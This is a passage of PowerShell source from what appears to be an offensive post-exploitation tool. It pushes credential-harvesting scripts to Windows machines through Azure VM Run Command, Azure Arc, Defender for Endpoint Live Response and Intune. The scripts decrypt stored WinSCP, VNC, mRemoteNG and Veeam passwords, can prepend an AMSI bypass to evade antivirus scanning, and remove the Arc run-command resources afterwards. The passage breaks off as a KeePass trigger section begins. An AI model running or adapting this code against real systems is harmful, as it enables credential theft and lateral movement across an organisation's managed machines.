        }
        if ($length -gt 0 -and $length -le $clearText.Length) {
            $clearText = $clearText.Substring(0, $length)
        }
        return $clearText
    } catch { return "[DECRYPT_FAILED]" }
}

try {
    # Registry-based sessions
    $sids = Get-ChildItem "Registry::HKEY_USERS" -ErrorAction SilentlyContinue | Where-Object { $_.Name -match 'S-1-5-21-' -and $_.Name -notmatch '_Classes$' }
    foreach ($sidItem in $sids) {
        $sid = $sidItem.PSChildName
        $username = try { (New-Object System.Security.Principal.SecurityIdentifier($sid)).Translate([System.Security.Principal.NTAccount]).Value } catch { $sid }
        $masterPwPath = "Registry::HKEY_USERS\$sid\Software\Martin Prikryl\WinSCP 2\Configuration\Security"
        $masterPw = $false
        if (Test-Path $masterPwPath) {
            $secProps = Get-ItemProperty -Path $masterPwPath -ErrorAction SilentlyContinue
            if ($secProps.UseMasterPassword -eq 1) { $masterPw = $true }
        }
        $sessionsPath = "Registry::HKEY_USERS\$sid\Software\Martin Prikryl\WinSCP 2\Sessions"
        if (-not (Test-Path $sessionsPath)) { continue }
        $sessions = Get-ChildItem $sessionsPath -ErrorAction SilentlyContinue
        foreach ($session in $sessions) {
            $props = Get-ItemProperty -Path $session.PSPath -ErrorAction SilentlyContinue
            if (-not $props.HostName) { continue }
            $decrypted = ""
            if ($props.Password -and -not $masterPw) {
                $decrypted = Decrypt-WinSCPPassword -Host $props.HostName -User $props.UserName -Password $props.Password
            }
            $results.Sessions += @{
                User = $username
                HostName = $props.HostName
                Port = if ($props.PortNumber) { $props.PortNumber } else { 22 }
                UserName = if ($props.UserName) { $props.UserName } else { "" }
                Password = if ($decrypted) { $decrypted } elseif ($masterPw) { "[MASTER_PASSWORD_PROTECTED]" } else { "" }
                Protocol = switch ($props.FSProtocol) { 0 { "SCP" } 5 { "SFTP" } 7 { "S3" } default { "SFTP" } }
                MasterPasswordProtected = $masterPw
            }
        }
    }
    # INI file-based sessions
    $profiles = Get-ChildItem "C:\Users" -Directory -ErrorAction SilentlyContinue | Where-Object { $_.Name -notin @('Public','Default','Default User','All Users') }
    foreach ($profile in $profiles) {
        $iniPaths = @(
            "$($profile.FullName)\AppData\Roaming\WinSCP.ini"
            "$($profile.FullName)\Documents\WinSCP.ini"
        )
        foreach ($iniPath in $iniPaths) {
            if (-not (Test-Path $iniPath)) { continue }
            $iniContent = Get-Content $iniPath -Raw
            $sections = [regex]::Matches($iniContent, '\[Sessions\\([^\]]+)\]([^[]*)')
            foreach ($section in $sections) {
                $sessionName = $section.Groups[1].Value
                $body = $section.Groups[2].Value
                $hostMatch = [regex]::Match($body, 'HostName=(.+)')
                if (-not $hostMatch.Success) { continue }
                $hostName = $hostMatch.Groups[1].Value.Trim()
                $userMatch = [regex]::Match($body, 'UserName=(.+)')
                $passMatch = [regex]::Match($body, 'Password=(.+)')
                $portMatch = [regex]::Match($body, 'PortNumber=(\d+)')
                $userName = if ($userMatch.Success) { $userMatch.Groups[1].Value.Trim() } else { "" }
                $password = if ($passMatch.Success) { $passMatch.Groups[1].Value.Trim() } else { "" }
                $port = if ($portMatch.Success) { [int]$portMatch.Groups[1].Value } else { 22 }
                $decrypted = ""
                if ($password) { $decrypted = Decrypt-WinSCPPassword -Host $hostName -User $userName -Password $password }
                $results.Sessions += @{
                    User = $profile.Name
                    HostName = $hostName
                    Port = $port
                    UserName = $userName
                    Password = if ($decrypted) { $decrypted } else { "" }
                    Protocol = "SFTP"
                    MasterPasswordProtected = $false
                }
            }
        }
    }
} catch {
    $results.Error = $_.Exception.Message
}
Write-Output "---WINSCP---"
Write-Output ($results | ConvertTo-Json -Depth 5 -Compress)
Write-Output "---SUCCESS---"
'@
}

function Parse-WinSCPOutput {
    param(
        [Parameter(Mandatory = $true)]
        [string]$Output
    )

    $result = @{
        Success = $false
        Sessions = @()
        Error = $null
    }

    if ($Output -match "---ERROR---") {
        $errorMsg = ($Output -split "---ERROR---")[1].Trim()
        $result.Error = $errorMsg
        return [PSCustomObject]$result
    }

    if ($Output -notmatch "---SUCCESS---") {
        $result.Error = "WinSCP extraction did not complete successfully"
        return [PSCustomObject]$result
    }

    try {
        if ($Output -match "---WINSCP---\s*(.+)\s*---SUCCESS---") {
            $data = $Matches[1].Trim()
            $parsed = $data | ConvertFrom-Json
            $result.Sessions = if ($parsed.Sessions) { $parsed.Sessions } else { @() }
            $result.Error = $parsed.Error
            $result.Success = $true
        }
    } catch {
        $result.Error = "Failed to parse WinSCP JSON: $($_.Exception.Message)"
    }

    return [PSCustomObject]$result
}

function Invoke-WinSCPExtraction {
    param(
        [Parameter(Mandatory = $true)]
        $Target,

        [Parameter(Mandatory = $false)]
        [string]$AmsiBypass,

        [Parameter(Mandatory = $false)]
        [int]$Timeout = 300
    )

    $result = @{
        TargetName = $Target.Name
        TargetType = $Target.Type
        ResourceGroup = $Target.ResourceGroup
        Subscription = $Target.Subscription
        OSType = $Target.OSType
        ExtractionType = "WINSCP"
        Success = $false
        Data = $null
        Error = $null
    }

    if ($Target.OSType -ne "Windows") {
        $result.Error = "WinSCP extraction is only supported on Windows targets"
        return [PSCustomObject]$result
    }

    try {
        if ($Target.SubscriptionId) {
            Set-AzContext -SubscriptionId $Target.SubscriptionId -ErrorAction SilentlyContinue -WarningAction SilentlyContinue | Out-Null
        }

        $script = Get-WinSCPExtractionScript

        if ($AmsiBypass -and (Test-Path $AmsiBypass)) {
            $amsiContent = Get-Content -Path $AmsiBypass -Raw
            $script = $amsiContent + "`n" + $script
        }

        $output = ""

        if ($Target.Type -eq "AzureVM") {
            $cmdResult = Invoke-AzVMRunCommand `
                -ResourceGroupName $Target.ResourceGroup `
                -VMName $Target.Name `
                -CommandId "RunPowerShellScript" `
                -ScriptString $script `
                -ErrorAction Stop
            $output = $cmdResult.Value[0].Message

        } elseif ($Target.Type -eq "Arc") {
            $runCommandName = "azx-winscp-$(Get-Date -Format 'yyyyMMdd-HHmmss')"
            $arcResult = Invoke-AzConnectedMachineRunCommand `
                -ResourceGroupName $Target.ResourceGroup `
                -MachineName $Target.Name `
                -Location $Target.Location `
                -RunCommandName $runCommandName `
                -SourceScript $script `
                -ErrorAction Stop
            $output = $arcResult.InstanceViewOutput
            Remove-AzConnectedMachineRunCommand `
                -ResourceGroupName $Target.ResourceGroup `
                -MachineName $Target.Name `
                -RunCommandName $runCommandName `
                -ErrorAction SilentlyContinue

        } elseif ($Target.Type -eq "MDEDevice") {
            Write-ColorOutput -Message "    [*] Using MDE Live Response (async)..." -Color "Cyan"
            $mdeResult = Invoke-MDELiveResponse `
                -MachineId $Target.MDEMachineId `
                -Command $script `
                -AccessToken $Target.MDEToken `
                -Timeout $Timeout
            if ($mdeResult.Status -eq "Success") {
                $output = $mdeResult.Output
            } else {
                throw "MDE Live Response failed: $($mdeResult.Output)"
            }

        } elseif ($Target.Type -eq "IntuneDevice") {
            Write-ColorOutput -Message "    [*] Using Intune Proactive Remediation (async)..." -Color "Cyan"
            $intuneResult = Invoke-IntuneRemediation `
                -DeviceId $Target.IntuneDeviceId `
                -Command $script `
                -PowerShell:$true `
                -DeviceName $Target.Name
            if ($intuneResult.Status -eq "Triggered") {
                $output = "---INTUNE_ASYNC---`nScript deployed to $($Target.Name). Check Intune portal for output."
                $result.Error = "Intune extraction is async-only - check Intune portal for results"
            } else {
                throw "Intune Remediation failed: $($intuneResult.Output)"
            }
        }

        $output = $output -replace "Enable succeeded:", ""
        $output = $output -replace "\[stdout\]", ""
        $output = $output -replace "\[stderr\]", ""
        $output = $output.Trim()

        $parsed = Parse-WinSCPOutput -Output $output

        $result.Data = $parsed
        $result.Success = $parsed.Success
        if ($parsed.Error) {
            $result.Error = $parsed.Error
        }

    } catch {
        $result.Error = $_.Exception.Message
    }

    return [PSCustomObject]$result
}

# ============================================
# VNC PASSWORD EXTRACTION (NetExec -M vnc)
# ============================================

function Get-VNCExtractionScript {
    return @'
$results = @{
    Passwords = @()
    Error = $null
}

function Decrypt-VNCPassword {
    param([byte[]]$EncBytes)
    try {
        $fixedKey = [byte[]](0xE8,0x4A,0xD6,0x60,0xC4,0x72,0x1A,0xE0)
        if ($EncBytes.Length -lt 8) {
            $padded = New-Object byte[] 8
            [Array]::Copy($EncBytes, $padded, $EncBytes.Length)
            $EncBytes = $padded
        }
        $des = New-Object System.Security.Cryptography.DESCryptoServiceProvider
        $des.Mode = [System.Security.Cryptography.CipherMode]::ECB
        $des.Padding = [System.Security.Cryptography.PaddingMode]::None
        $des.Key = $fixedKey
        $decryptor = $des.CreateDecryptor()
        $decrypted = $decryptor.TransformFinalBlock($EncBytes, 0, 8)
        $des.Dispose()
        $text = [System.Text.Encoding]::ASCII.GetString($decrypted).TrimEnd([char]0)
        return $text
    } catch { return "[DECRYPT_FAILED]" }
}

try {
    # Registry paths
    $regPaths = @(
        @{ Path = "HKLM:\SOFTWARE\RealVNC\WinVNC4"; Value = "Password"; Type = "RealVNC4" }
        @{ Path = "HKLM:\SOFTWARE\RealVNC\vncserver"; Value = "Password"; Type = "RealVNC Server" }
        @{ Path = "HKLM:\Software\TightVNC\Server"; Value = "Password"; Type = "TightVNC" }
        @{ Path = "HKLM:\Software\TightVNC\Server"; Value = "ControlPassword"; Type = "TightVNC Control" }
        @{ Path = "HKLM:\Software\TightVNC\Server"; Value = "PasswordViewOnly"; Type = "TightVNC ViewOnly" }
    )
    foreach ($rp in $regPaths) {
        if (Test-Path $rp.Path) {
            try {
                $val = Get-ItemProperty -Path $rp.Path -Name $rp.Value -ErrorAction SilentlyContinue
                if ($val.$($rp.Value)) {
                    $rawBytes = $val.$($rp.Value)
                    if ($rawBytes -is [byte[]]) {
                        $decrypted = Decrypt-VNCPassword -EncBytes $rawBytes
                        $results.Passwords += @{ Source = $rp.Path; Type = $rp.Type; DecryptedPassword = $decrypted }
                    } elseif ($rawBytes -is [string]) {
                        $hexBytes = [byte[]]@()
                        for ($i = 0; $i -lt $rawBytes.Length; $i += 2) {
                            $hexBytes += [Convert]::ToByte($rawBytes.Substring($i, 2), 16)
                        }
                        $decrypted = Decrypt-VNCPassword -EncBytes $hexBytes
                        $results.Passwords += @{ Source = $rp.Path; Type = $rp.Type; DecryptedPassword = $decrypted }
                    }
                }
            } catch {}
        }
    }
    # UltraVNC INI files
    $iniPaths = @(
        "$env:ProgramFiles\UltraVNC\ultravnc.ini"
        "${env:ProgramFiles(x86)}\UltraVNC\ultravnc.ini"
    )
    foreach ($ini in $iniPaths) {
        if (Test-Path $ini) {
            try {
                $content = Get-Content $ini -Raw
                $pwMatches = [regex]::Matches($content, '(?:passwd|passwd2)=([0-9A-Fa-f]+)', [System.Text.RegularExpressions.RegexOptions]::IgnoreCase)
                foreach ($m in $pwMatches) {
                    $hexStr = $m.Groups[1].Value
                    $hexBytes = [byte[]]@()
                    for ($i = 0; $i -lt $hexStr.Length -and $i -lt 16; $i += 2) {
                        $hexBytes += [Convert]::ToByte($hexStr.Substring($i, 2), 16)
                    }
                    $decrypted = Decrypt-VNCPassword -EncBytes $hexBytes
                    $results.Passwords += @{ Source = $ini; Type = "UltraVNC"; DecryptedPassword = $decrypted }
                }
            } catch {}
        }
    }
} catch {
    $results.Error = $_.Exception.Message
}
Write-Output "---VNC---"
Write-Output ($results | ConvertTo-Json -Depth 5 -Compress)
Write-Output "---SUCCESS---"
'@
}

function Parse-VNCOutput {
    param(
        [Parameter(Mandatory = $true)]
        [string]$Output
    )

    $result = @{
        Success = $false
        Passwords = @()
        Error = $null
    }

    if ($Output -match "---ERROR---") {
        $errorMsg = ($Output -split "---ERROR---")[1].Trim()
        $result.Error = $errorMsg
        return [PSCustomObject]$result
    }

    if ($Output -notmatch "---SUCCESS---") {
        $result.Error = "VNC extraction did not complete successfully"
        return [PSCustomObject]$result
    }

    try {
        if ($Output -match "---VNC---\s*(.+)\s*---SUCCESS---") {
            $data = $Matches[1].Trim()
            $parsed = $data | ConvertFrom-Json
            $result.Passwords = if ($parsed.Passwords) { $parsed.Passwords } else { @() }
            $result.Error = $parsed.Error
            $result.Success = $true
        }
    } catch {
        $result.Error = "Failed to parse VNC JSON: $($_.Exception.Message)"
    }

    return [PSCustomObject]$result
}

function Invoke-VNCExtraction {
    param(
        [Parameter(Mandatory = $true)]
        $Target,

        [Parameter(Mandatory = $false)]
        [string]$AmsiBypass,

        [Parameter(Mandatory = $false)]
        [int]$Timeout = 300
    )

    $result = @{
        TargetName = $Target.Name
        TargetType = $Target.Type
        ResourceGroup = $Target.ResourceGroup
        Subscription = $Target.Subscription
        OSType = $Target.OSType
        ExtractionType = "VNC"
        Success = $false
        Data = $null
        Error = $null
    }

    if ($Target.OSType -ne "Windows") {
        $result.Error = "VNC extraction is only supported on Windows targets"
        return [PSCustomObject]$result
    }

    try {
        if ($Target.SubscriptionId) {
            Set-AzContext -SubscriptionId $Target.SubscriptionId -ErrorAction SilentlyContinue -WarningAction SilentlyContinue | Out-Null
        }

        $script = Get-VNCExtractionScript

        if ($AmsiBypass -and (Test-Path $AmsiBypass)) {
            $amsiContent = Get-Content -Path $AmsiBypass -Raw
            $script = $amsiContent + "`n" + $script
        }

        $output = ""

        if ($Target.Type -eq "AzureVM") {
            $cmdResult = Invoke-AzVMRunCommand `
                -ResourceGroupName $Target.ResourceGroup `
                -VMName $Target.Name `
                -CommandId "RunPowerShellScript" `
                -ScriptString $script `
                -ErrorAction Stop
            $output = $cmdResult.Value[0].Message

        } elseif ($Target.Type -eq "Arc") {
            $runCommandName = "azx-vnc-$(Get-Date -Format 'yyyyMMdd-HHmmss')"
            $arcResult = Invoke-AzConnectedMachineRunCommand `
                -ResourceGroupName $Target.ResourceGroup `
                -MachineName $Target.Name `
                -Location $Target.Location `
                -RunCommandName $runCommandName `
                -SourceScript $script `
                -ErrorAction Stop
            $output = $arcResult.InstanceViewOutput
            Remove-AzConnectedMachineRunCommand `
                -ResourceGroupName $Target.ResourceGroup `
                -MachineName $Target.Name `
                -RunCommandName $runCommandName `
                -ErrorAction SilentlyContinue

        } elseif ($Target.Type -eq "MDEDevice") {
            Write-ColorOutput -Message "    [*] Using MDE Live Response (async)..." -Color "Cyan"
            $mdeResult = Invoke-MDELiveResponse `
                -MachineId $Target.MDEMachineId `
                -Command $script `
                -AccessToken $Target.MDEToken `
                -Timeout $Timeout
            if ($mdeResult.Status -eq "Success") {
                $output = $mdeResult.Output
            } else {
                throw "MDE Live Response failed: $($mdeResult.Output)"
            }

        } elseif ($Target.Type -eq "IntuneDevice") {
            Write-ColorOutput -Message "    [*] Using Intune Proactive Remediation (async)..." -Color "Cyan"
            $intuneResult = Invoke-IntuneRemediation `
                -DeviceId $Target.IntuneDeviceId `
                -Command $script `
                -PowerShell:$true `
                -DeviceName $Target.Name
            if ($intuneResult.Status -eq "Triggered") {
                $output = "---INTUNE_ASYNC---`nScript deployed to $($Target.Name). Check Intune portal for output."
                $result.Error = "Intune extraction is async-only - check Intune portal for results"
            } else {
                throw "Intune Remediation failed: $($intuneResult.Output)"
            }
        }

        $output = $output -replace "Enable succeeded:", ""
        $output = $output -replace "\[stdout\]", ""
        $output = $output -replace "\[stderr\]", ""
        $output = $output.Trim()

        $parsed = Parse-VNCOutput -Output $output

        $result.Data = $parsed
        $result.Success = $parsed.Success
        if ($parsed.Error) {
            $result.Error = $parsed.Error
        }

    } catch {
        $result.Error = $_.Exception.Message
    }

    return [PSCustomObject]$result
}

# ============================================
# MREMOTENG CONNECTION EXTRACTION (NetExec -M mremoteng)
# ============================================

function Get-MRemoteNGExtractionScript {
    return @'
$results = @{
    Connections = @()
    Error = $null
}

function Decrypt-MRemoteNGPassword {
    param([string]$Base64Password, [string]$MasterPassword = "mR3m")
    try {
        $encrypted = [Convert]::FromBase64String($Base64Password)
        if ($encrypted.Length -lt 33) { return "[ENCRYPTED]" }
        $salt = $encrypted[0..15]
        $nonce = $encrypted[16..27]
        $tagAndCiphertext = $encrypted[28..($encrypted.Length-1)]
        if ($tagAndCiphertext.Length -lt 16) { return "[ENCRYPTED]" }
        # Try AesGcm (.NET 6+ / PS7)
        try {
            $keyBytes = New-Object byte[] 32
            $pbkdf2 = New-Object System.Security.Cryptography.Rfc2898DeriveBytes($MasterPassword, $salt, 1000, [System.Security.Cryptography.HashAlgorithmName]::SHA1)
            $keyBytes = $pbkdf2.GetBytes(32)
            $pbkdf2.Dispose()
            $ciphertext = $tagAndCiphertext[0..($tagAndCiphertext.Length-17)]
            $tag = $tagAndCiphertext[($tagAndCiphertext.Length-16)..($tagAndCiphertext.Length-1)]
            $aesGcm = [System.Security.Cryptography.AesGcm]::new($keyBytes)
            $plaintext = New-Object byte[] $ciphertext.Length
            $aesGcm.Decrypt($nonce, $ciphertext, $tag, $plaintext)
            $aesGcm.Dispose()
            return [System.Text.Encoding]::UTF8.GetString($plaintext)
        } catch {
            return "[ENCRYPTED:AesGcm_unavailable]"
        }
    } catch {
        return "[ENCRYPTED]"
    }
}

try {
    $profiles = Get-ChildItem "C:\Users" -Directory -ErrorAction SilentlyContinue | Where-Object { $_.Name -notin @('Public','Default','Default User','All Users') }
    foreach ($profile in $profiles) {
        $searchPaths = @(
            "$($profile.FullName)\AppData\Local\mRemoteNG\confCons.xml"
            "$($profile.FullName)\AppData\Roaming\mRemoteNG\confCons.xml"
            "$($profile.FullName)\Documents\confCons.xml"
            "$($profile.FullName)\Desktop\confCons.xml"
        )
        foreach ($configPath in $searchPaths) {
            if (-not (Test-Path $configPath)) { continue }
            try {
                [xml]$config = Get-Content $configPath -Raw
                $nodes = $config.SelectNodes("//Node[@Type='Connection']")
                foreach ($node in $nodes) {
                    $password = ""
                    $encrypted = $false
                    if ($node.Password) {
                        $password = Decrypt-MRemoteNGPassword -Base64Password $node.Password
                        if ($password -match "^\[ENCRYPTED") { $encrypted = $true }
                    }
                    $results.Connections += @{
                        User = $profile.Name
                        ConfigPath = $configPath
                        Name = if ($node.Name) { $node.Name } else { "" }
                        Hostname = if ($node.Hostname) { $node.Hostname } else { "" }
                        Port = if ($node.Port) { $node.Port } else { "" }
                        Username = if ($node.Username) { $node.Username } else { "" }
                        Password = $password
                        Protocol = if ($node.Protocol) { $node.Protocol } else { "" }
                        Encrypted = $encrypted
                    }
                }
            } catch {}
        }
    }
} catch {
    $results.Error = $_.Exception.Message
}
Write-Output "---MREMOTENG---"
Write-Output ($results | ConvertTo-Json -Depth 5 -Compress)
Write-Output "---SUCCESS---"
'@
}

function Parse-MRemoteNGOutput {
    param(
        [Parameter(Mandatory = $true)]
        [string]$Output
    )

    $result = @{
        Success = $false
        Connections = @()
        Error = $null
    }

    if ($Output -match "---ERROR---") {
        $errorMsg = ($Output -split "---ERROR---")[1].Trim()
        $result.Error = $errorMsg
        return [PSCustomObject]$result
    }

    if ($Output -notmatch "---SUCCESS---") {
        $result.Error = "mRemoteNG extraction did not complete successfully"
        return [PSCustomObject]$result
    }

    try {
        if ($Output -match "---MREMOTENG---\s*(.+)\s*---SUCCESS---") {
            $data = $Matches[1].Trim()
            $parsed = $data | ConvertFrom-Json
            $result.Connections = if ($parsed.Connections) { $parsed.Connections } else { @() }
            $result.Error = $parsed.Error
            $result.Success = $true
        }
    } catch {
        $result.Error = "Failed to parse mRemoteNG JSON: $($_.Exception.Message)"
    }

    return [PSCustomObject]$result
}

function Invoke-MRemoteNGExtraction {
    param(
        [Parameter(Mandatory = $true)]
        $Target,

        [Parameter(Mandatory = $false)]
        [string]$AmsiBypass,

        [Parameter(Mandatory = $false)]
        [int]$Timeout = 300
    )

    $result = @{
        TargetName = $Target.Name
        TargetType = $Target.Type
        ResourceGroup = $Target.ResourceGroup
        Subscription = $Target.Subscription
        OSType = $Target.OSType
        ExtractionType = "MREMOTENG"
        Success = $false
        Data = $null
        Error = $null
    }

    if ($Target.OSType -ne "Windows") {
        $result.Error = "mRemoteNG extraction is only supported on Windows targets"
        return [PSCustomObject]$result
    }

    try {
        if ($Target.SubscriptionId) {
            Set-AzContext -SubscriptionId $Target.SubscriptionId -ErrorAction SilentlyContinue -WarningAction SilentlyContinue | Out-Null
        }

        $script = Get-MRemoteNGExtractionScript

        if ($AmsiBypass -and (Test-Path $AmsiBypass)) {
            $amsiContent = Get-Content -Path $AmsiBypass -Raw
            $script = $amsiContent + "`n" + $script
        }

        $output = ""

        if ($Target.Type -eq "AzureVM") {
            $cmdResult = Invoke-AzVMRunCommand `
                -ResourceGroupName $Target.ResourceGroup `
                -VMName $Target.Name `
                -CommandId "RunPowerShellScript" `
                -ScriptString $script `
                -ErrorAction Stop
            $output = $cmdResult.Value[0].Message

        } elseif ($Target.Type -eq "Arc") {
            $runCommandName = "azx-mremoteng-$(Get-Date -Format 'yyyyMMdd-HHmmss')"
            $arcResult = Invoke-AzConnectedMachineRunCommand `
                -ResourceGroupName $Target.ResourceGroup `
                -MachineName $Target.Name `
                -Location $Target.Location `
                -RunCommandName $runCommandName `
                -SourceScript $script `
                -ErrorAction Stop
            $output = $arcResult.InstanceViewOutput
            Remove-AzConnectedMachineRunCommand `
                -ResourceGroupName $Target.ResourceGroup `
                -MachineName $Target.Name `
                -RunCommandName $runCommandName `
                -ErrorAction SilentlyContinue

        } elseif ($Target.Type -eq "MDEDevice") {
            Write-ColorOutput -Message "    [*] Using MDE Live Response (async)..." -Color "Cyan"
            $mdeResult = Invoke-MDELiveResponse `
                -MachineId $Target.MDEMachineId `
                -Command $script `
                -AccessToken $Target.MDEToken `
                -Timeout $Timeout
            if ($mdeResult.Status -eq "Success") {
                $output = $mdeResult.Output
            } else {
                throw "MDE Live Response failed: $($mdeResult.Output)"
            }

        } elseif ($Target.Type -eq "IntuneDevice") {
            Write-ColorOutput -Message "    [*] Using Intune Proactive Remediation (async)..." -Color "Cyan"
            $intuneResult = Invoke-IntuneRemediation `
                -DeviceId $Target.IntuneDeviceId `
                -Command $script `
                -PowerShell:$true `
                -DeviceName $Target.Name
            if ($intuneResult.Status -eq "Triggered") {
                $output = "---INTUNE_ASYNC---`nScript deployed to $($Target.Name). Check Intune portal for output."
                $result.Error = "Intune extraction is async-only - check Intune portal for results"
            } else {
                throw "Intune Remediation failed: $($intuneResult.Output)"
            }
        }

        $output = $output -replace "Enable succeeded:", ""
        $output = $output -replace "\[stdout\]", ""
        $output = $output -replace "\[stderr\]", ""
        $output = $output.Trim()

        $parsed = Parse-MRemoteNGOutput -Output $output

        $result.Data = $parsed
        $result.Success = $parsed.Success
        if ($parsed.Error) {
            $result.Error = $parsed.Error
        }

    } catch {
        $result.Error = $_.Exception.Message
    }

    return [PSCustomObject]$result
}

# ============================================
# VEEAM CREDENTIAL EXTRACTION (NetExec -M veeam)
# ============================================

function Get-VeeamExtractionScript {
    return @'
$results = @{
    DatabaseConfig = $null
    Credentials = @()
    Error = $null
}
try {
    $veeamRegPath = "HKLM:\SOFTWARE\Veeam\Veeam Backup and Replication"
    if (-not (Test-Path $veeamRegPath)) {
        $results.Error = "Veeam Backup and Replication not installed"
        Write-Output "---VEEAM---"
        Write-Output ($results | ConvertTo-Json -Depth 5 -Compress)
        Write-Output "---SUCCESS---"
        return
    }
    $veeamProps = Get-ItemProperty -Path $veeamRegPath -ErrorAction SilentlyContinue
    $sqlInstance = $null
    $sqlDatabase = $null
    $dbConfigPath = "$veeamRegPath\DatabaseConfigurations"
    if (Test-Path $dbConfigPath) {
        $dbProps = Get-ItemProperty -Path $dbConfigPath -ErrorAction SilentlyContinue
        $sqlInstance = if ($dbProps.SqlServerName) { $dbProps.SqlServerName } elseif ($dbProps.SqlInstanceName) { $dbProps.SqlInstanceName } else { $null }
        $sqlDatabase = if ($dbProps.SqlDatabaseName) { $dbProps.SqlDatabaseName } else { "VeeamBackup" }
    }
    if (-not $sqlInstance) {
        $sqlInstance = if ($veeamProps.SqlServerName) { $veeamProps.SqlServerName } elseif ($veeamProps.SqlInstanceName) { $veeamProps.SqlInstanceName } else { "localhost\VEEAMSQL2012" }
    }
    if (-not $sqlDatabase) { $sqlDatabase = "VeeamBackup" }
    $results.DatabaseConfig = @{
        SqlInstance = $sqlInstance
        SqlDatabase = $sqlDatabase
        InstallPath = if ($veeamProps.CorePath) { $veeamProps.CorePath } else { "" }
    }
    # Query credentials from SQL
    try {
        $connStr = "Server=$sqlInstance;Database=$sqlDatabase;Integrated Security=True;TrustServerCertificate=True"
        $conn = New-Object System.Data.SqlClient.SqlConnection($connStr)
        $conn.Open()
        $cmd = $conn.CreateCommand()
        $cmd.CommandText = "SELECT [user_name],[password],[description] FROM [dbo].[Credentials]"
        $reader = $cmd.ExecuteReader()
        while ($reader.Read()) {
            $userName = $reader["user_name"]
            $encPassword = $reader["password"]
            $description = $reader["description"]
            $decrypted = ""
            if ($encPassword) {
                try {
                    $encBytes = [Convert]::FromBase64String($encPassword)
                    $decBytes = [System.Security.Cryptography.ProtectedData]::Unprotect($encBytes, $null, [System.Security.Cryptography.DataProtectionScope]::LocalMachine)
                    $decrypted = [System.Text.Encoding]::UTF8.GetString($decBytes)
                } catch {
                    $decrypted = "[DPAPI_FAILED:$($_.Exception.Message)]"
                }
            }
            $results.Credentials += @{
                Username = $userName
                Password = if ($decrypted) { $decrypted } else { "" }
                Description = if ($description) { $description } else { "" }
            }
        }
        $reader.Close()
        $conn.Close()
    } catch {
        $results.Error = "SQL query failed: $($_.Exception.Message)"
    }
} catch {
    $results.Error = $_.Exception.Message
}
Write-Output "---VEEAM---"
Write-Output ($results | ConvertTo-Json -Depth 5 -Compress)
Write-Output "---SUCCESS---"
'@
}

function Parse-VeeamOutput {
    param(
        [Parameter(Mandatory = $true)]
        [string]$Output
    )

    $result = @{
        Success = $false
        DatabaseConfig = $null
        Credentials = @()
        Error = $null
    }

    if ($Output -match "---ERROR---") {
        $errorMsg = ($Output -split "---ERROR---")[1].Trim()
        $result.Error = $errorMsg
        return [PSCustomObject]$result
    }

    if ($Output -notmatch "---SUCCESS---") {
        $result.Error = "Veeam extraction did not complete successfully"
        return [PSCustomObject]$result
    }

    try {
        if ($Output -match "---VEEAM---\s*(.+)\s*---SUCCESS---") {
            $data = $Matches[1].Trim()
            $parsed = $data | ConvertFrom-Json
            $result.DatabaseConfig = $parsed.DatabaseConfig
            $result.Credentials = if ($parsed.Credentials) { $parsed.Credentials } else { @() }
            $result.Error = $parsed.Error
            $result.Success = $true
        }
    } catch {
        $result.Error = "Failed to parse Veeam JSON: $($_.Exception.Message)"
    }

    return [PSCustomObject]$result
}

function Invoke-VeeamExtraction {
    param(
        [Parameter(Mandatory = $true)]
        $Target,

        [Parameter(Mandatory = $false)]
        [string]$AmsiBypass,

        [Parameter(Mandatory = $false)]
        [int]$Timeout = 300
    )

    $result = @{
        TargetName = $Target.Name
        TargetType = $Target.Type
        ResourceGroup = $Target.ResourceGroup
        Subscription = $Target.Subscription
        OSType = $Target.OSType
        ExtractionType = "VEEAM"
        Success = $false
        Data = $null
        Error = $null
    }

    if ($Target.OSType -ne "Windows") {
        $result.Error = "Veeam extraction is only supported on Windows targets"
        return [PSCustomObject]$result
    }

    try {
        if ($Target.SubscriptionId) {
            Set-AzContext -SubscriptionId $Target.SubscriptionId -ErrorAction SilentlyContinue -WarningAction SilentlyContinue | Out-Null
        }

        $script = Get-VeeamExtractionScript

        if ($AmsiBypass -and (Test-Path $AmsiBypass)) {
            $amsiContent = Get-Content -Path $AmsiBypass -Raw
            $script = $amsiContent + "`n" + $script
        }

        $output = ""

        if ($Target.Type -eq "AzureVM") {
            $cmdResult = Invoke-AzVMRunCommand `
                -ResourceGroupName $Target.ResourceGroup `
                -VMName $Target.Name `
                -CommandId "RunPowerShellScript" `
                -ScriptString $script `
                -ErrorAction Stop
            $output = $cmdResult.Value[0].Message

        } elseif ($Target.Type -eq "Arc") {
            $runCommandName = "azx-veeam-$(Get-Date -Format 'yyyyMMdd-HHmmss')"
            $arcResult = Invoke-AzConnectedMachineRunCommand `
                -ResourceGroupName $Target.ResourceGroup `
                -MachineName $Target.Name `
                -Location $Target.Location `
                -RunCommandName $runCommandName `
                -SourceScript $script `
                -ErrorAction Stop
            $output = $arcResult.InstanceViewOutput
            Remove-AzConnectedMachineRunCommand `
                -ResourceGroupName $Target.ResourceGroup `
                -MachineName $Target.Name `
                -RunCommandName $runCommandName `
                -ErrorAction SilentlyContinue

        } elseif ($Target.Type -eq "MDEDevice") {
            Write-ColorOutput -Message "    [*] Using MDE Live Response (async)..." -Color "Cyan"
            $mdeResult = Invoke-MDELiveResponse `
                -MachineId $Target.MDEMachineId `
                -Command $script `
                -AccessToken $Target.MDEToken `
                -Timeout $Timeout
            if ($mdeResult.Status -eq "Success") {
                $output = $mdeResult.Output
            } else {
                throw "MDE Live Response failed: $($mdeResult.Output)"
            }

        } elseif ($Target.Type -eq "IntuneDevice") {
            Write-ColorOutput -Message "    [*] Using Intune Proactive Remediation (async)..." -Color "Cyan"
            $intuneResult = Invoke-IntuneRemediation `
                -DeviceId $Target.IntuneDeviceId `
                -Command $script `
                -PowerShell:$true `
                -DeviceName $Target.Name
            if ($intuneResult.Status -eq "Triggered") {
                $output = "---INTUNE_ASYNC---`nScript deployed to $($Target.Name). Check Intune portal for output."
                $result.Error = "Intune extraction is async-only - check Intune portal for results"
            } else {
                throw "Intune Remediation failed: $($intuneResult.Output)"
            }
        }

        $output = $output -replace "Enable succeeded:", ""
        $output = $output -replace "\[stdout\]", ""
        $output = $output -replace "\[stderr\]", ""
        $output = $output.Trim()

        $parsed = Parse-VeeamOutput -Output $output

        $result.Data = $parsed
        $result.Success = $parsed.Success
        if ($parsed.Error) {
            $result.Error = $parsed.Error
        }

    } catch {
        $result.Error = $_.Exception.Message
    }

    return [PSCustomObject]$result
}

# ============================================
# KEEPASS TRIGGER EXPLOITATION (NetExec -M keepass_trigger)
# ============================================

function Get-KeePassTriggerScript {
    param(
        [Parameter(Mandatory = $false)]
